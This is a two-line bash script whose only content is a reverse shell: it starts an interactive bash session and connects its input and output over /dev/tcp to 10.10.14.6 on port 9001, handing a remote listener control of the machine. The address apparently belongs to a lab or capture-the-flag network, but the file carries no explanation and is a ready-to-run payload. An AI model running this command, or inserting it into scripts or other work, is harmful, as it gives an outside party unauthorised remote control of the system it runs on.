#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/9001 0>&1
